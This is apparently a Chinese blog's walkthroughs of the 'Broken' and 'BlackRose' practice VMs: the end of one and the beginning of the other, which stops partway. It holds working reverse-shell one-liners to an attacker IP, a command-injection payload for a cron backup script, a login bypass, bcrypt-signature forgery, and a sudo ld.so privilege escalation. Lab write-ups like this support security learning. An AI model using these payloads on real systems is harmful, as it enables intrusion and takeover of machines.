class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/back$ <span class="hljs-built_in">ls</span> ..<br><span class="hljs-built_in">ls</span> ..<br>back       etc             lib         media  run   usr<br>backup.py  flag.txt        lib32       mnt    sbin  var<br>bin        home            lib64       opt    srv   vmlinuz<br>boot       initrd.img      libx32      proc   sys   vmlinuz.old<br>dev        initrd.img.old  lost+found  root   tmp<br>www-data@broken:/$ <span class="hljs-built_in">cat</span> backup.py<br><span class="hljs-built_in">cat</span> backup.py<br>import os<br>import datetime<br>size = os.path.getsize(<span class="hljs-string">&quot;/home/alice/backup/path.txt&quot;</span>)<br><br><span class="hljs-keyword">if</span> size &gt; 3 :<br><br>        file = open(<span class="hljs-string">&quot;/home/alice/backup/path.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        path = file.read().strip()<br>        file.close()<br>        cmd = <span class="hljs-string">&quot;rsync -a &quot;</span>+path+<span class="hljs-string">&quot; /home/alice/backup --exclude back --exclude backup.py&amp;&amp; chown -R www-data:alice /home/alice/backup &amp;&amp; chmod -R 777 /home/alice/backup&quot;</span><br>        os.system(cmd)<br><span class="hljs-built_in">date</span> = str(datetime.datetime.now())<br><span class="hljs-built_in">log</span> = open(<span class="hljs-string">&quot;/home/alice/backup/logbot.log&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>log.write(<span class="hljs-string">&quot;last check : &quot;</span>+<span class="hljs-built_in">date</span>)<br>log.close()<br></code></pre></td></tr></table></figure><p>backup.py 文件主要是对 <code>/home/alice/backup/path.txt</code> 中的路径进行同步备份，并且将备份后的用户权限设置为了一般用户可读。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/back$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 36K<br>152663 drwxr-xr-x  3 root root 4.0K Mar 25  2020 .<br>     2 drwxr-xr-x 19 root root 4.0K Mar 25  2020 ..<br>152665 drwxr-xr-x  2 root root 4.0K Mar 25  2020 backup<br>152673 -rwxr-xr-x  1 root root  493 Mar 25  2020 backup.py<br>152670 -rw-r--r--  1 root root  114 Mar 25  2020 check.py<br>152671 -rwxr-xr-x  1 root root  274 Mar 25  2020 hack.sh<br>152674 -rwxr-xr-x  1 root root  132 Mar 25  2020 load.sh<br>152664 -rw-------  1 root root 1.2K Mar 25  2020 post<br>152672 -rw-------  1 root root 1.2K Mar 25  2020 root<br></code></pre></td></tr></table></figure><p>各文件内容如下</p><p><img src="/pic/ed56c647fde127f642ca8800ddf4b1bb_MD5.png"></p><p>但是核心点还是 alice 用户目录下的 backup 文件夹，目前还是没法实现用户切换或者提权</p><p>这里忽略了一点，卡了很久，文件虽然是可读不可写，但是目录权限是 777 ，这意味着我们可以更改文件名，文件名并不是由文件权限所限制的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice/script$ <span class="hljs-built_in">mv</span> log.py log.py.bak<br><span class="hljs-built_in">mv</span> log.py log.py.bak<br>www-data@broken:/home/alice/script$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.101&quot;,444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt; log.py<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提前开启监听，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 444        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 58756<br>alice@broken:/root$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>alice<br>alice@broken:/root$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(alice) gid=1000(alice) groupes=1000(alice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)<br>alice@broken:/root$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>alice@broken:~$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 52K<br>  31 drwxr-xr-x 6 alice alice 4,0K oct.  16 10:25 .<br> 193 drwxr-xr-x 3 root  root  4,0K mars  24  2020 ..<br>7147 drwx------ 2 alice alice 4,0K mars  26  2020 backup<br>6538 lrwxrwxrwx 1 alice alice    9 mars  24  2020 .bash_history -&gt; /dev/null<br>  67 -rw-r--r-x 1 alice alice  220 mars  24  2020 .bash_logout<br>7046 -rw-r--r-- 1 alice alice  570 janv. 31  2010 .bashrc<br>6523 drwxr-xr-x 3 alice alice 4,0K mars  24  2020 .cache<br>7131 -rw-r--r-- 1 alice alice   29 mars  25  2020 flag.txt<br>6842 drwxr-xr-x 3 alice alice 4,0K mars  24  2020 .<span class="hljs-built_in">local</span><br>6841 -rw-r--r-- 1 alice alice  141 mars  25  2020 note.txt<br>  46 -rw-r--r-- 1 alice alice  148 août  17  2015 .profile<br>6859 drwxrwxrwx 2 alice alice 4,0K oct.  16 10:24 script<br>  54 -rw-r--r-- 1 alice alice   66 mars  25  2020 .selected_editor<br>6982 -rw-r--r-- 1 alice alice  173 mars  24  2020 .wget-hsts<br></code></pre></td></tr></table></figure><p>发现在 alice 用户权限下，文件夹中多了 backup 文件夹，进入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>7147 drwx------ 2 alice alice 4,0K mars  26  2020 .<br>  31 drwxr-xr-x 6 alice alice 4,0K oct.  16 10:25 ..<br>9698 -rw-r--r-- 1 alice alice   27 mars  26  2020 flag.txt<br>9697 -rw-r--r-- 1 alice alice  150 oct.  16 10:28 logbot.log<br>9696 -rw-r--r-- 1 alice alice  129 mars  26  2020 note.txt<br>9695 -rw-r--r-- 1 alice alice    0 mars  26  2020 path.txt<br></code></pre></td></tr></table></figure><p>接下来我尝试了直接写入文件名，但是 <code>logbot.log</code> 提示必须是文件夹，因为我们之前以及看到了定时执行的 backup.py 的内容，其中 path.txt 中的内容是完全可控的，且没有过滤就直接执行了，考虑是否可以在此直接反弹提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/etc/shadow /home/alice/backup &amp;&amp;nc 192.168.1.101 445 -e /bin/bash &amp;&amp;rsync -a&#x27;</span> &gt;path.txt<br><br>alice@broken:~/backup$ <span class="hljs-built_in">cat</span> logbot.log<br><span class="hljs-built_in">cat</span> logbot.log<br>[INFO] 10:26:01 16/10/2023  : no path <span class="hljs-keyword">in</span> path.txt<br>[SECURITY] 10:39:01 16/10/2023  :  [&amp;] may be an attack attempt. To avoid this the script was interrupted<br></code></pre></td></tr></table></figure><p>竟然还有检测 <code>&amp;</code> 这是我没想到的，如果想获取 shadow 文件，只能把 etc 目录整个备份下来，感觉不太行</p><p>关于如何利用此处的可控输入提权，卡了很久。尝试先拿 <code>/root</code> 目录下的内容看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/root&quot;</span> &gt;path.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/root&quot;</span> &gt;path.txt<br>alice@broken:~/backup$ <span class="hljs-built_in">cd</span> root<br><span class="hljs-built_in">cd</span> root<br>alice@broken:~/backup/root$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>7172 drwxrwxrwx 4 www-data alice 4,0K oct.  16 10:25 .<br>7147 drwxrwxrwx 3 www-data alice 4,0K oct.  16 10:46 ..<br>8708 lrwxrwxrwx 1 www-data alice    9 mars  24  2020 .bash_history -&gt; /dev/null<br>8845 -rwxrwxrwx 1 www-data alice  570 janv. 31  2010 .bashrc<br>8728 drwxrwxrwx 3 www-data alice 4,0K mars  24  2020 .cache<br>8852 -rwxrwxrwx 1 www-data alice  508 mars  26  2020 flag.txt<br>8730 drwxrwxrwx 3 www-data alice 4,0K mars  24  2020 .<span class="hljs-built_in">local</span><br>8854 -rwxrwxrwx 1 www-data alice    0 mars  26  2020 log.txt<br>8846 -rwxrwxrwx 1 www-data alice  148 août  17  2015 .profile<br>8848 -rwxrwxrwx 1 www-data alice   66 mars  25  2020 .selected_editor<br>8856 -rwxrwxrwx 1 www-data alice  105 mars  26  2020 test.py<br>8850 -rwxrwxrwx 1 www-data alice  173 mars  24  2020 .wget-hsts<br>alice@broken:~/backup/root$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>Congratulation <span class="hljs-keyword">for</span> the root flag !<br><br>     _________<br>    / ======= \<br>   / __________\<br>  | ___________ |<br>  | | -root-  | |<br>  | |         | |<br>  | |_________| |_____________________________________________________________________<br>  \=____________/                     enjoyed this VM ?                               )<br>  / <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; \                     I love bitcoin                                 /</span><br><span class="hljs-string"> / ::::::::::::: \           1Ba6vFEamUenzrXr4scGQ8QLya7t7zYZ1S                  =D-&#x27;</span><br><span class="hljs-string">(_________________)</span><br></code></pre></td></tr></table></figure><p>但还是没提权啊，找了两篇博客看了看，发现似乎这里直接拿 flag 就行。emmmm</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件系统权限的理解还不太行，只盯着只读文件了，导致反弹 shell 过于费劲</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BlackRose 靶机</title>
    <link href="/2023/10/fcad96c9b901.html"/>
    <url>/2023/10/fcad96c9b901.html</url>
    
    <content type="html"><![CDATA[<h1 id="BlackRose-靶机"><a href="#BlackRose-靶机" class="headerlink" title="BlackRose 靶机"></a>BlackRose 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.21  <br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ mysql 192.168.1.21 -u root -p <br>Enter password: <br>ERROR 2002 (HY000): Can<span class="hljs-string">&#x27;t connect to local server through socket &#x27;</span>/run/mysqld/mysqld.sock<span class="hljs-string">&#x27; (2)</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,3306 192.168.1.21          <br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 d1:9b:10:88:15:e9:7a:c4:1a:29:07:3c:21:87:c4:ac (RSA)<br>|   256 e3:50:0b:c9:e8:f1:68:7f:e7:cf:ec:de:7b:b9:20:a1 (ECDSA)<br>|_  256 55:0e:96:22:cc:50:20:d9:<span class="hljs-built_in">dd</span>:c2:ff:5b:25:d0:d7:2b (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| http-title: BlackRose<br>|_Requested resource was login.php<br>3306/tcp open  mysql   MySQL (unauthorized)<br><br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap --script=vuln -p22,80,3306 192.168.1.21 <br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|       httponly flag not <span class="hljs-built_in">set</span><br>|   /login.php: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /login.php: Possible admin folder</span><br><span class="hljs-string">3306/tcp open  mysql</span><br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>打开页面，只有登录框，尝试了一下简单的 SQL 注入，没成功。尝试注册个新用户，看看有没有越权之类的逻辑漏洞，没发现。</p><p>登陆后看起来有个执行命令的地方，但我并不是 admin，无法执行。</p><p><img src="/pic/9cde899b7b9f79eb135cb0187b011225_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo dirsearch -u http://192.168.1.21  <br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Target: http://192.168.1.21/<br><br>[05:27:16] Starting: <br>[05:27:17] 301 -  309B  - /js  -&gt;  http://192.168.1.21/js/                                                <br>[05:27:19] 200 -   21B  - /404.php                                          <br>[05:27:31] 301 -  310B  - /css  -&gt;  http://192.168.1.21/css/                <br>[05:27:31] 302 -    0B  - /database.php  -&gt;  404.php                        <br>[05:27:33] 200 -   21B  - /footer.php                                       <br>[05:27:34] 200 -   21B  - /header.php                                       <br>[05:27:34] 301 -  313B  - /images  -&gt;  http://192.168.1.21/images/          <br>[05:27:34] 302 -    0B  - /images/  -&gt;  ../404.php                          <br>[05:27:35] 301 -  310B  - /img  -&gt;  http://192.168.1.21/img/                <br>[05:27:35] 302 -    0B  - /index.php  -&gt;  login.php                         <br>[05:27:35] 302 -    0B  - /index.php/login/  -&gt;  login.php                  <br>[05:27:36] 302 -    0B  - /js/  -&gt;  ../404.php                              <br>[05:27:37] 200 -    1KB - /login.php                                        <br>[05:27:37] 302 -    0B  - /logout.php  -&gt;  404.php                          <br>[05:27:43] 200 -    2KB - /register.php                                     <br>[05:27:44] 403 -  277B  - /server-status/                                   <br>[05:27:44] 403 -  277B  - /server-status<br>[05:27:49] 302 -    0B  - /vendors/  -&gt;  ../404.php <br></code></pre></td></tr></table></figure><p>目录爆破未发现新的暴露面。</p><p>尝试了弱口令爆破，失败。对执行命令的接口使用 Burp 自带的字典进行 FUZZ，失败。</p><p><img src="/pic/547f297ad14243c400e32bc6dd22d4ff_MD5.png"></p><h2 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h2><p>在这里卡了蛮久的，没什么思路，就跑去看 WP 里，里面提到了登录绕过，谷歌搜索 login bypass</p><p><a href="https://book.hacktricks.xyz/pentesting-web/login-bypass">Login Bypass - HackTricks</a></p><p><img src="/pic/812b6d71f7a9e3975a601f3d745c8eed_MD5.png"></p><p>在 passwd 后加 <code>[]</code> 绕过登录成功，登陆到了 admin 用户</p><p><img src="/pic/ef45912ca09e9e22ed6b8eb9a5233832_MD5.png"></p><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>indexcsrf 过期得蛮快的，如果提示 timeout 的话就刷新下网页，似乎只能使用 whoami 命令，别的命令会提示</p><p><img src="/pic/633c65181503478dd2d7daa589012356_MD5.png"></p><p>把 Signature 的值复制下来，john 爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo john <span class="hljs-built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt  <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (bcrypt [Blowfish 32/64 X3])<br>Cost 1 (iteration count) is 1024 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-built_in">whoami</span>           (?)     <br></code></pre></td></tr></table></figure><p>似乎 Signature 的值必须是命令的加密值，哈希是 Bcrypt 算法，随便找了个在线网站<a href="https://bcrypt-generator.com/">Bcrypt-Generator.com - Generate, Check, Hash, Decode Bcrypt Strings</a>，得到了 <code>id</code> 的加密值，验证了自己的猜测。</p><p>找个反弹 shell 的代码，可以多换几个试试，有的成功有的失败</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> <span class="hljs-number">443</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><p><img src="/pic/184bbbf9e93259975c916b1bd663e485_MD5.png"></p><p>通过在线网站得到了加密后的值</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">$<span class="hljs-number">2</span>a$<span class="hljs-number">10</span>$v<span class="hljs-number">49</span>VHI<span class="hljs-attr">VsiGtoUeTaZdbTuuaWpnkS92</span><span class="hljs-meta">o5</span>/<span class="hljs-name">G5</span>MZaHloHkFWRr<span class="hljs-meta">o7</span>buoq<br></code></pre></td></tr></table></figure><p>在网页中直接修改源代码，再点击 <code>Run</code></p><p><img src="/pic/63b5b545336912571c11149966c3a7a1_MD5.png"></p><p>反弹 shell 成功。需要备注的是，这里可能需要反复换反弹 shell 的代码，有些反弹代码是不成功的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.21] 51246<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1121): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@BlackRose:/var/www/html$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:98:92:98 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.21/24 brd 192.168.1.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe98:9298/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux BlackRose 4.15.0-69-generic <span class="hljs-comment">#78-Ubuntu SMP Wed Nov 6 11:30:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@BlackRose:/var/www/html$ sudo -l      <br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on BlackRose:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on BlackRose:<br>    (delx : delx) NOPASSWD: /bin/ld.so<br></code></pre></td></tr></table></figure><p>sudo -l 感觉得到了有用的信息</p><p><img src="/pic/e2678307adfa062e1095ba4353e9f997_MD5.png"></p><p>gtfobins 中找到了利用手法，</p><p>这个内核版本感觉可以内核提权。先信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@BlackRose:/var/www/html$ sudo -u delx /bin/ld.so /bin/bash -p<br>sudo -u delx /bin/ld.so /bin/bash -p<br><span class="hljs-built_in">whoami</span><br>delx<br><span class="hljs-built_in">id</span><br>uid=1002(delx) gid=1002(delx) <span class="hljs-built_in">groups</span>=1002(delx)<br><span class="hljs-built_in">ls</span> -alih /home<br>total 16K<br>1179649 drwxr-xr-x  4 root     root     4.0K Nov  9  2019 .<br>      2 drwxr-xr-x 24 root     root     4.0K Nov 13  2019 ..<br>1179652 drwxr-xr-x  6 delx     delx     4.0K Dec  5  2019 delx<br>1183766 drwx------  5 yourname yourname 4.0K Dec  5  2019 yourname<br></code></pre></td></tr></table></figure><p>先看看网站根目录吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alih<br>total 76K<br> 266386 drwxr-xr-x  8 root root 4.0K Jul 11  2020 .<br>3153970 drwxr-xr-x  3 root root 4.0K Nov  7  2019 ..<br> 266400 -rw-r--r--  1 root root   37 Nov 13  2019 404.php<br> 262153 -rw-r--r--  1 root root 1.2K Dec  5  2019 RL.php<br> 262150 -rw-r--r--  1 root root 1.2K Nov 26  2019 RP.php<br> 262148 -rw-r--r--  1 root root  956 Nov 26  2019 Rx.php<br> 397314 drwxrwxr-x  5 root root 4.0K Oct 22  2019 bootstrap<br> 793475 drwxrwxr-x  2 root root 4.0K Nov 15  2019 css<br> 266801 